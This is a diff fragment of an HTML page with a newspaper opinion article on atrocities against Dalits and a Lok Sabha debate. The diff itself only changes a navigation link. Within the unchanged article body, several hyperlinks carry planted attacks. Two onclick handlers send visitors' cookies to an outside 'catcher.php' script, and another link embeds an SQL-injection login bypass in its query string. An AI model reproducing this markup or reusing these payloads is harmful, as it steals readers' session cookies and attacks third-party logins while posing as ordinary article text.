@@ -19,7 +19,7 @@
 
 <p class="details">Written by Sukhadeo Thorat | Published:September 16, 2016 12:04 am<a href="#"></a> </p>
 <h2 align="right"><a href="20160915-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160917-opinion.php"> Next </a> </h2>
 <p>
 
 Many watched the recent discussion on <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">atrocities on Dalits </a> in the Lok Sabha with hope. They felt that since the present policy has had limited success in reducing atrocities on Dalits, the discussion would throw up a new initiative. What emerged at the end of day, however, did not touch the core issue: The <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">roots of the continuing violence against Dalits </a> and a durable solution to the problem. There were some rays of hope. The members recognised the problem of persisting atrocities. Most suggested that political parties should incorporate the discourse on caste and equity. They felt that access to education, <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">agricultural land and capital </a> would help improve the condition of Dalits.
